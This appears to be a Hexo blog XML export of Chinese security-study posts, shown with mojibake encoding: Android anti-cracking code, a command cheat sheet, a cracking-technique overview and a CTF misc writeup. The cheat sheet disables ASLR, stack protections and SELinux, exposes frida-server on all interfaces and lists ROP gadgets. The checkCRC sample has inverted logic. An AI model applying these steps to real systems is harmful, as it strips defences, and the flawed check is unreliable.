class="title">android</span>.<span class="title">app</span>.<span class="title">backup</span>.<span class="title">BackupAgentHelper</span></span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">preference</span>.<span class="title">Preference</span></span></span><br><span class="line">-keep interface android.support.v4.app.** &#123; *; &#125;</span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.** &#123; *; &#125;</span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span></span><br><span class="line">-keep interface android.support.v7.app.** &#123; *; &#125;</span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v7</span>.** &#123; *; &#125;</span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v7</span>.**</span></span><br><span class="line">-keep public <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">app</span>.<span class="title">Fragment</span></span></span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.**&#123;*;&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¸æ··æ·†Serializableæ¥å£çš„å­ç±»ä¸­æŒ‡å®šçš„æŸäº›æˆå‘˜å˜é‡å’Œæ–¹æ³•</span></span><br><span class="line">-keepclassmembers <span class="class"><span class="keyword">class</span> * <span class="title">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> &#123;</span></span><br><span class="line">    static final long serialVersionUID;</span><br><span class="line">    private static final java.io.ObjectStreamField[] serialPersistentFields;</span><br><span class="line">    private void writeObject(java.io.ObjectOutputStream);</span><br><span class="line">    private void readObject(java.io.ObjectInputStream);</span><br><span class="line">    java.lang.Object writeReplace();</span><br><span class="line">    java.lang.Object readResolve();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span> Moduleè‡ªå®šä¹‰ <span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">######</span><span class="comment">######</span> ä¸æ··æ·†å¼•ç”¨çš„jar <span class="comment">######</span><span class="comment">######</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¸æ··æ·†butterknife</span></span><br><span class="line">-keepclasseswithmembernames <span class="class"><span class="keyword">class</span> * &#123;</span></span><br><span class="line">    @butterknife.* &lt;fields&gt;;</span><br><span class="line">&#125;</span><br><span class="line">-keepclasseswithmembernames <span class="class"><span class="keyword">class</span> * &#123;</span></span><br><span class="line">    @butterknife.* &lt;methods&gt;;</span><br><span class="line">&#125;</span><br><span class="line">-dontwarn butterknife.internal.**</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¸æ··æ·†AndroidBootstrap</span></span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">com</span>.<span class="title">beardedhen</span>.<span class="title">androidbootstrap</span>.**&#123;*;&#125;</span></span><br><span class="line">-dontwarn com.beardedhen.androidbootstrap.**</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¸æ··æ·†åº”ç”¨å®è‡ªæ›´æ–°jar</span></span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">com</span>.<span class="title">qq</span>.**</span></span><br><span class="line">-dontwarn com.qq.**</span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">com</span>.<span class="title">tencent</span>.**</span></span><br><span class="line">-dontwarn com.tencent.**</span><br><span class="line"> </span><br><span class="line"><span class="comment">######</span><span class="comment">######</span> ä¿æŒè‡ªå®šä¹‰æ§ä»¶ä¸è¢«æ··æ·† <span class="comment">######</span><span class="comment">######</span></span><br><span class="line"> </span><br><span class="line">-keepclasseswithmembernames <span class="class"><span class="keyword">class</span> * &#123;</span></span><br><span class="line">    public &lt;init&gt;(android.content.Context);</span><br><span class="line">&#125;</span><br><span class="line">-keepclasseswithmembernames <span class="class"><span class="keyword">class</span> * &#123;</span></span><br><span class="line">    public &lt;init&gt;(android.content.Context, android.util.AttributeSet);</span><br><span class="line">&#125;</span><br><span class="line">-keepclasseswithmembernames <span class="class"><span class="keyword">class</span> * &#123;</span></span><br><span class="line">    public &lt;init&gt;(android.content.Context, android.util.AttributeSet, int);</span><br><span class="line">&#125;</span><br><span class="line">-keepclasseswithmembernames <span class="class"><span class="keyword">class</span> * &#123;</span></span><br><span class="line">    public &lt;init&gt;(android.content.Context, android.util.AttributeSet, int, int);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">######</span><span class="comment">######</span> é¡¹ç›®å†…éƒ¨ç±»çš„æ··æ·†é…ç½® <span class="comment">######</span><span class="comment">######</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¸æ··æ·†æ•´ä¸ªåŒ…</span></span><br><span class="line"><span class="comment">#-keep class com.test.test.**&#123;*;&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#ä¸æ··æ·†å¯¹å¤–æ¥å£çš„publicç±»åå’Œæˆå‘˜åï¼Œå¦åˆ™å¤–éƒ¨æ— æ³•è°ƒç”¨</span></span><br><span class="line"><span class="comment">#-keep public interface com.test.test.**&#123;*;&#125;</span></span><br><span class="line"><span class="comment">#-keep public enum com.test.test.**&#123;*;&#125;</span></span><br><span class="line"><span class="comment">#-keep public class com.test.test.**&#123;</span></span><br><span class="line"><span class="comment">#    public *;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#å¿½ç•¥é¡¹ç›®ä¸­å…¶ä»–Moduleçš„è­¦å‘Š ############</span></span><br><span class="line"><span class="comment">#-dontwarn com.test.test.**</span></span><br></pre></td></tr></table></figure>

<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/wangwangli6/article/details/79800520" target="_blank" rel="noopener">https://blog.csdn.net/wangwangli6/article/details/79800520</a></p>
<h2 id="NDKä¿æŠ¤"><a href="#NDKä¿æŠ¤" class="headerlink" title="NDKä¿æŠ¤"></a>NDKä¿æŠ¤</h2><p>ä½¿ç”¨NDKå¼€å‘å¯å¢åŠ é€†å‘éš¾åº¦ã€‚</p>
<h2 id="å¤–å£³ä¿æŠ¤"><a href="#å¤–å£³ä¿æŠ¤" class="headerlink" title="å¤–å£³ä¿æŠ¤"></a>å¤–å£³ä¿æŠ¤</h2><p>åŠ å£³åŠ å›ºã€‚</p>
<h1 id="å¯¹æŠ—åŠ¨æ€è°ƒè¯•"><a href="#å¯¹æŠ—åŠ¨æ€è°ƒè¯•" class="headerlink" title="å¯¹æŠ—åŠ¨æ€è°ƒè¯•"></a>å¯¹æŠ—åŠ¨æ€è°ƒè¯•</h1><h2 id="æ£€æµ‹è°ƒè¯•å™¨"><a href="#æ£€æµ‹è°ƒè¯•å™¨" class="headerlink" title="æ£€æµ‹è°ƒè¯•å™¨"></a>æ£€æµ‹è°ƒè¯•å™¨</h2><p>é€šè¿‡æ£€æŸ¥debuggableçš„å€¼æ˜¯å¦è¢«ä¿®æ”¹è¿‡åˆ¤æ–­æ˜¯å¦è¢«è°ƒè¯•ã€‚</p>
<p><img src="/2020/03/18/Androidè½¯ä»¶çš„åç ´è§£æŠ€æœ¯/image-20200319163846893.png" alt="image-20200319163846893"></p>
<p>æ£€æµ‹è°ƒè¯•å™¨æ˜¯å¦è¿æ¥ï¼š</p>
<p><img src="/2020/03/18/Androidè½¯ä»¶çš„åç ´è§£æŠ€æœ¯/image-20200319164003984.png" alt="image-20200319164003984"></p>
<h2 id="æ£€æµ‹æ¨¡æ‹Ÿå™¨"><a href="#æ£€æµ‹æ¨¡æ‹Ÿå™¨" class="headerlink" title="æ£€æµ‹æ¨¡æ‹Ÿå™¨"></a>æ£€æµ‹æ¨¡æ‹Ÿå™¨</h2><p>é€šè¿‡å‘½ä»¤<code>adb shell getprop</code>å¯¹æ¯”æ¨¡æ‹Ÿå™¨å’ŒçœŸæœºã€‚</p>
<p>çœŸæœºï¼š</p>
<p><img src="/2020/03/18/Androidè½¯ä»¶çš„åç ´è§£æŠ€æœ¯/image-20200319164906736.png" alt="image-20200319164906736"></p>
<p>æ¨¡æ‹Ÿå™¨ï¼š</p>
<p><img src="/2020/03/18/Androidè½¯ä»¶çš„åç ´è§£æŠ€æœ¯/image-20200319175344380.png" alt="image-20200319175344380"></p>
<p>è¿™ä¸æ²¡åŒºåˆ«å—ã€‚ã€‚ã€‚ç°åœ¨æ¨¡æ‹Ÿå™¨éƒ½è¿™ä¹ˆå…ˆè¿›äº†ï¼Œä¹¦ä¸Šæœ‰ç‚¹è½åäº†ã€‚ã€‚ã€‚</p>
<p>å°±è´´ä¸€ä¸‹æ—§ä»£ç å§ï¼Œè™½ç„¶ä¸ä¸€å®šèƒ½ç”¨ï¼Œä»¥åä¹Ÿèƒ½ä½œå‚è€ƒã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">æ£€æµ‹ä»£ç ï¼š</span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isRunningInEmualtor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">boolean</span> qemuKernel = <span class="keyword">false</span>;</span><br><span class="line">    	Process process = <span class="keyword">null</span>;</span><br><span class="line">        DataOutputStream os = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;  </span><br><span class="line">            process = Runtime.getRuntime().exec(<span class="string">"getprop ro.kernel.qemu"</span>);  </span><br><span class="line">            os = <span class="keyword">new</span> DataOutputStream(process.getOutputStream());</span><br><span class="line">            BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream(),<span class="string">"GBK"</span>));</span><br><span class="line">            os.writeBytes(<span class="string">"exit\n"</span>);  </span><br><span class="line">            os.flush();</span><br><span class="line">            process.waitFor();</span><br><span class="line">            qemuKernel = (Integer.valueOf(in.readLine()) == <span class="number">1</span>);</span><br><span class="line">            Log.d(<span class="string">"com.droider.checkqemu"</span>, <span class="string">"æ£€æµ‹åˆ°æ¨¡æ‹Ÿå™¨:"</span> + qemuKernel);             </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">        	qemuKernel = <span class="keyword">false</span>;</span><br><span class="line">            Log.d(<span class="string">"com.droider.checkqemu"</span>, <span class="string">"run failed"</span> + e.getMessage()); </span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;  </span><br><span class="line">                <span class="keyword">if</span> (os != <span class="keyword">null</span>) &#123;  </span><br><span class="line">                    os.close();  </span><br><span class="line">                &#125;  </span><br><span class="line">                process.destroy();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            	</span><br><span class="line">            &#125;  </span><br><span class="line">            Log.d(<span class="string">"com.droider.checkqemu"</span>, <span class="string">"run finally"</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> qemuKernel;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getProp</span><span class="params">(Context context, String property)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">try</span> &#123;</span><br><span class="line">    		ClassLoader cl = context.getClassLoader();</span><br><span class="line">    		Class SystemProperties = cl.loadClass(<span class="string">"android.os.SystemProperties"</span>);</span><br><span class="line">    		Method method = SystemProperties.getMethod(<span class="string">"get"</span>, String.class);</span><br><span class="line">    		Object[] params = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">    		params[<span class="number">0</span>] = <span class="keyword">new</span> String(property);</span><br><span class="line">    		<span class="keyword">return</span> (String)method.invoke(SystemProperties, params);</span><br><span class="line">    	&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="é˜²æ­¢é‡ç¼–è¯‘"><a href="#é˜²æ­¢é‡ç¼–è¯‘" class="headerlink" title="é˜²æ­¢é‡ç¼–è¯‘"></a>é˜²æ­¢é‡ç¼–è¯‘</h1><h2 id="æ£€æŸ¥ç­¾å"><a href="#æ£€æŸ¥ç­¾å" class="headerlink" title="æ£€æŸ¥ç­¾å"></a>æ£€æŸ¥ç­¾å</h2><p>æ£€æŸ¥ç­¾åçš„hashcodeæ˜¯å¦ä¸€è‡´ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSignature</span><span class="params">(String packageName)</span> </span>&#123;      </span><br><span class="line">		PackageManager pm = <span class="keyword">this</span>.getPackageManager();</span><br><span class="line">		PackageInfo pi = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">int</span> sig = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			pi = pm.getPackageInfo(packageName, PackageManager.GET_SIGNATURES);</span><br><span class="line">			Signature[] s = pi.signatures;</span><br><span class="line">			sig = s[<span class="number">0</span>].hashCode();  </span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">			sig = <span class="number">0</span>;</span><br><span class="line">			e1.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sig;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ ¡éªŒä¿æŠ¤"><a href="#æ ¡éªŒä¿æŠ¤" class="headerlink" title="æ ¡éªŒä¿æŠ¤"></a>æ ¡éªŒä¿æŠ¤</h2><p>æ£€æµ‹classes.dexçš„æ ¡éªŒå€¼ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">checkCRC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">boolean</span> beModified = <span class="keyword">false</span>;</span><br><span class="line">    	<span class="keyword">long</span> crc = Long.parseLong(getString(R.string.crc));</span><br><span class="line">    	ZipFile zf;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			zf = <span class="keyword">new</span> ZipFile(getApplicationContext().getPackageCodePath());</span><br><span class="line">	    	ZipEntry ze = zf.getEntry(<span class="string">"classes.dex"</span>);</span><br><span class="line">	    	Log.d(<span class="string">"com.droider.checkcrc"</span>, String.valueOf(ze.getCrc()));</span><br><span class="line">	    	<span class="keyword">if</span> (ze.getCrc() == crc) &#123;</span><br><span class="line">	    		beModified = <span class="keyword">true</span>;</span><br><span class="line">	    	&#125; </span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">			beModified = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> beModified;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Androidé€†å‘</category>
      </categories>
      <tags>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨å‘½ä»¤è®°å½•</title>
    <url>/2020/03/16/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linuxå‘½ä»¤è®°å½•"><a href="#Linuxå‘½ä»¤è®°å½•" class="headerlink" title="Linuxå‘½ä»¤è®°å½•"></a>Linuxå‘½ä»¤è®°å½•</h1><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">echo xxxxx &gt; xx.txt ä¼šè‡ªåŠ¨æ¢è¡Œ</span><br><span class="line">echo -n xxxxx &gt; xx.txt ä¸ä¼šæ¢è¡Œ</span><br><span class="line"></span><br><span class="line">sudo passwd root //æ›´æ”¹rootå¯†ç </span><br><span class="line"></span><br><span class="line">//é“¾æ¥</span><br><span class="line">$ sudo rm -rf python</span><br><span class="line">$ sudo ln -s /usr/bin/python3  /usr/bin/python</span><br><span class="line">//æ¢å†…æ ¸ç¨‹åº</span><br><span class="line">sudo apt-get install synaptic</span><br><span class="line">//é‡å¯æ¡Œé¢</span><br><span class="line">sudo /etc/init.d/gdm restart</span><br><span class="line">//å…³é—­ASLR</span><br><span class="line">echo <span class="number">0</span> &gt; /<span class="keyword">proc</span>/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">NXï¼š-z<span class="title"> execstack</span> / -z<span class="title"> noexecstack</span> (å…³é—­ / å¼€å¯)    ä¸è®©æ‰§è¡Œæ ˆä¸Šçš„æ•°æ®ï¼Œäºæ˜¯JMP<span class="title"> ESPå°±ä¸èƒ½ç”¨äº†</span></span><br><span class="line"><span class="title">Canaryï¼š-fno-stack-protector</span> /-fstack-protector / -fstack-protector-all (å…³é—­ / å¼€å¯ / å…¨å¼€å¯)  æ ˆé‡Œæ’å…¥cookieä¿¡æ¯</span><br><span class="line">PIEï¼š-no-pie / -pie (å…³é—­ / å¼€å¯)   åœ°å€éšæœºåŒ–ï¼Œå¦å¤–æ‰“å¼€åä¼šæœ‰get_pc_thunk</span><br><span class="line">RELROï¼š-z<span class="title"> norelro</span> / -z<span class="title"> lazy</span> / -z<span class="title"> now</span> (å…³é—­ / éƒ¨åˆ†å¼€å¯ / å®Œå…¨å¼€å¯)  å¯¹GOTè¡¨å…·æœ‰å†™æƒé™</span><br><span class="line">gcc -z<span class="title"> execstack</span> -fno-stack-protector -no-pie -z<span class="title"> norelro</span></span><br><span class="line"><span class="title">//linuxå‘½ä»¤ï¼Œå°†æŒ‡å®šç¨‹åºåœ¨æŒ‡å®šç«¯å£è¿è¡Œï¼š</span></span><br><span class="line"><span class="title">socat</span> tcp-listen:10001,reuseaddr,fork<span class="title"> EXEC:./file_name,pty,raw,echo=0</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">//åœ¨x64ä¸‹é€šå¸¸å‚æ•°ä»å·¦åˆ°å³ä¾æ¬¡æ”¾åœ¨rdi,</span> rsi,<span class="title"> rdx,</span> rcx,<span class="title"> r8,</span> r9ï¼Œå¤šå‡ºæ¥çš„å‚æ•°æ‰ä¼šå…¥æ ˆï¼ˆæ ¹æ®è°ƒç”¨çº¦å®šçš„æ–¹å¼å¯èƒ½æœ‰ä¸åŒï¼Œé€šå¸¸æ˜¯è¿™æ ·ï¼‰</span><br><span class="line"></span><br><span class="line">ç‰¹æ®Šçš„gadgets:</span><br><span class="line">é€šå¸¸ä½äºx64çš„ELFç¨‹åºä¸­çš„__libc_csu_init,</span><br><span class="line">universal_gadget1 = 0x40075a           #ä¸‡èƒ½gadget1ï¼špop<span class="title"> rbx;</span> pop<span class="title"> rbp;</span> pop<span class="title"> r12;</span> pop<span class="title"> r13;</span> pop<span class="title"> r14;</span> pop<span class="title"> r15;</span> retn</span><br><span class="line">universal_gadget2 = 0x400740        #ä¸‡èƒ½gadget2ï¼šmov<span class="title"> rdx,</span> r13;<span class="title"> mov</span> rsi,<span class="title"> r14;</span> mov<span class="title"> edi,</span> r15d;<span class="title"> call</span> qword<span class="title"> ptr</span> [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<h1 id="ABDå‘½ä»¤"><a href="#ABDå‘½ä»¤" class="headerlink" title="ABDå‘½ä»¤"></a>ABDå‘½ä»¤</h1><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">adb tcpip <span class="number">5555</span></span><br><span class="line">adb connect xxxxx:<span class="number">5555</span></span><br><span class="line">å¼ºåˆ¶è¿è¡Œ<span class="number">32</span>ä½æ¨¡å¼ï¼šadb install --abi armeabi-v7a xxxx.apk</span><br><span class="line"></span><br><span class="line">cat /<span class="keyword">proc</span>/cpuinfo #AndroidæŸ¥çœ‹cpuæ¶æ„</span><br><span class="line"></span><br><span class="line">adb<span class="title"> shell</span> am<span class="title"> start</span> -D -n<span class="title"> com.iscclockk/.MainActivity</span></span><br><span class="line"><span class="title">jdbé™„åŠ </span> jdb -connect<span class="title"> com.sun.jdi.SocketAttach:hostname=localhost,port=8700</span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title">setenforce</span> 0</span><br><span class="line">è®¾ç½®å…¨å±€è°ƒè¯•ï¼š</span><br><span class="line">magisk<span class="title"> resetprop</span> ro.debuggable 1</span><br><span class="line">stop;start;</span><br><span class="line"></span><br><span class="line">fridaéæ ‡å‡†ç«¯å£è¿æ¥:</span><br><span class="line">	./frida-server -l 0.0.0.0:6666</span><br><span class="line"><span class="title">	frida-ps</span> -H 192.168.1.102:6666</span><br><span class="line"><span class="title">	objection</span> -p 6666</span><br><span class="line">ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨ï¼š</span><br><span class="line">adb<span class="title"> shell</span> am<span class="title"> set-debug-app</span> -w<span class="title"> com.d3ctf.noname</span></span><br><span class="line"><span class="title">æŸ¥çœ‹androidæ˜¯32è¿˜æ˜¯64ï¼š</span></span><br><span class="line"><span class="title">adb</span> shell<span class="title"> getprop</span> ro.product.cpu.abi</span><br></pre></td></tr></table></figure>

<h1 id="dockerå‘½ä»¤"><a href="#dockerå‘½ä»¤" class="headerlink" title="dockerå‘½ä»¤"></a>dockerå‘½ä»¤</h1><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¼å…¥é•œåƒï¼šdocker import - ubuntu/17.04.amd64</span></span><br><span class="line"><span class="comment">//è¿è¡Œé•œåƒï¼šdocker run -it -p 23946:23946 ubuntu/17.04.amd64 /bin/bash</span></span><br><span class="line">  ä¼šåˆ›å»ºä¸€ä¸ªdockerå®¹å™¨ï¼Œç¬¬ä¸€ä¸ªç«¯å£æ˜¯å®¿ä¸»æœºçš„ç«¯å£ï¼Œç¬¬äºŒä¸ªæ˜¯å®¹å™¨çš„ç«¯å£</span><br><span class="line"><span class="comment">//åˆ—å‡ºå®¹å™¨ï¼šdocker container ls -a</span></span><br><span class="line"><span class="comment">//å®¹å™¨é‡å‘½åï¼šdocker container rename old_name new_name</span></span><br><span class="line"><span class="comment">//æ‰“å¼€å®¹å™¨çš„shellï¼šdocker exec -it container_name /bin/bash</span></span><br><span class="line"><span class="comment">//å¯åŠ¨å®¹å™¨ï¼šdocker start container_name</span></span><br><span class="line"><span class="comment">//å¤åˆ¶ï¼šdocker container cp file_name container_name:/root</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¼å…¥é•œåƒ</span></span><br><span class="line">docker load -<span class="selector-tag">i</span> nginx.tar</span><br><span class="line"><span class="comment">//å¯¼å‡ºé•œåƒ</span></span><br><span class="line">docker save -o nginx<span class="selector-class">.tar</span> nginx:latest</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Androidæ¼æ´æŒ–æ˜</title>
    <url>/2020/03/15/Android%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Androidé€†å‘</category>
      </categories>
      <tags>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>Androidè½¯ä»¶çš„ç ´è§£æŠ€æœ¯</title>
    <url>/2020/03/14/Android%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="æˆæƒkeyç»•è¿‡"><a href="#æˆæƒkeyç»•è¿‡" class="headerlink" title="æˆæƒkeyç»•è¿‡"></a>æˆæƒkeyç»•è¿‡</h2><p>ä¸€ä¸ªapké€šè¿‡å¦ä¸€ä¸ªapkè·å–æˆæƒkeyå³å¯è§£é”é«˜çº§åŠŸèƒ½ï¼Œä¸¤ä¸ªapkå…±äº«èµ„æºéœ€è¦æŒ‡å®š<code>android:sharedUserId=&quot;xxx.xxx.xxx&quot;</code>ç›¸åŒã€‚é€šè¿‡<code>creatPackageContext()</code>æ–¹æ³•å¯ä»¥è®¿é—®å¦ä¸€ä¸ªapkçš„èµ„æºã€‚</p>
<p>å¯¹äºç¤ºä¾‹è½¯ä»¶ï¼Œå¯é€šè¿‡é€†å‘ç®—æ³•ã€ä¿®æ”¹å…³é”®è·³è½¬ç­‰æ–¹æ³•è¿›è¡Œç ´è§£ã€‚</p>
<h2 id="åºåˆ—å·ä¿æŠ¤"><a href="#åºåˆ—å·ä¿æŠ¤" class="headerlink" title="åºåˆ—å·ä¿æŠ¤"></a>åºåˆ—å·ä¿æŠ¤</h2><p>é€šè¿‡æ³¨å†Œç éªŒè¯ã€‚</p>
<h2 id="ç½‘ç»œéªŒè¯"><a href="#ç½‘ç»œéªŒè¯" class="headerlink" title="ç½‘ç»œéªŒè¯"></a>ç½‘ç»œéªŒè¯</h2><p>é™æ€ç½‘ç»œéªŒè¯é€šè¿‡å¾—åˆ°æœåŠ¡å™¨çš„åé¦ˆä¿¡æ¯è¿›è¡ŒéªŒè¯ã€‚</p>
<p>åŠ¨æ€ç½‘ç»œéªŒè¯é€šè¿‡ä¸æœåŠ¡å™¨äº¤äº’è¿›è¡ŒéªŒè¯ã€‚</p>
<h2 id="In-app-Billing-åº”ç”¨å†…ä»˜è´¹"><a href="#In-app-Billing-åº”ç”¨å†…ä»˜è´¹" class="headerlink" title="In-app Billing (åº”ç”¨å†…ä»˜è´¹)"></a>In-app Billing (åº”ç”¨å†…ä»˜è´¹)</h2><p>è·³è¿‡ã€‚</p>
<h2 id="Google-Play-Licenseä¿æŠ¤"><a href="#Google-Play-Licenseä¿æŠ¤" class="headerlink" title="Google Play Licenseä¿æŠ¤"></a>Google Play Licenseä¿æŠ¤</h2><p>è·³è¿‡ã€‚</p>
<h2 id="é‡å¯éªŒè¯"><a href="#é‡å¯éªŒè¯" class="headerlink" title="é‡å¯éªŒè¯"></a>é‡å¯éªŒè¯</h2><p>ç¬¬ä¸€æ¬¡æ³¨å†Œä¿å­˜éªŒè¯ä¿¡æ¯ï¼Œå†æ¬¡å¼€å¯ç¨‹åºæ—¶è¯»å–éªŒè¯ä¿¡æ¯è¿›è¡ŒéªŒè¯ã€‚ä¿å­˜ä¿¡æ¯æœ‰å†…éƒ¨å­˜å‚¨ã€å¤–éƒ¨å­˜å‚¨ã€æ•°æ®åº“å­˜å‚¨ã€SharedProferencesç­‰4ç§æ–¹å¼ã€‚</p>
<h2 id="Mono-for-Android"><a href="#Mono-for-Android" class="headerlink" title="Mono for Android"></a>Mono for Android</h2><h2 id="Qt-for-Android"><a href="#Qt-for-Android" class="headerlink" title="Qt for Android"></a>Qt for Android</h2>]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>Androidé€†å‘</category>
      </categories>
      <tags>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup</title>
    <url>/2020/03/11/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9CTF%E9%83%A8%E5%88%86writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="åºŸè¯"><a href="#åºŸè¯" class="headerlink" title="åºŸè¯"></a>åºŸè¯</h1><p>æ‰“äº†ä¸¤å¤©çš„æ¯”èµ›ï¼Œå°åšäº†å‡ é“é¢˜ï¼Œä¸å¯è°“ä¸å……å®ã€‚è™½ç„¶æ‰¾ä¸åˆ°å·¥ä½œï¼Œä¹Ÿè¦ç»§ç»­å­¦ä¹ ã€‚</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ç®€å•çš„misc"><a href="#ç®€å•çš„misc" class="headerlink" title="ç®€å•çš„misc"></a>ç®€å•çš„misc</h2><p>ç”¨010editoræ‰“å¼€photo.jpgï¼Œåœ¨æœ€åº•éƒ¨çœ‹åˆ°zipæ ¼å¼ï¼Œ</p>
<p><img src="/2020/03/11/é«˜æ ¡æˆ˜å½¹CTFéƒ¨åˆ†writeup/image-20200311151648233.png" alt="image-20200311151648233"></p>
<p>ç›´æ¥æ”¹åç¼€è§£å‹ï¼Œå¾—åˆ°æ‘©æ–¯å¯†ç ï¼Œè§£å¯†æ˜¯flag.zipçš„å¯†ç ï¼Œè¾“å…¥åå¾—åˆ°base64åŠ å¯†çš„flagã€‚</p>
<p>è§£å¯†å³å¯ã€‚flag{Th1s_is_FlaG_you_aRE_rigHT}</p>
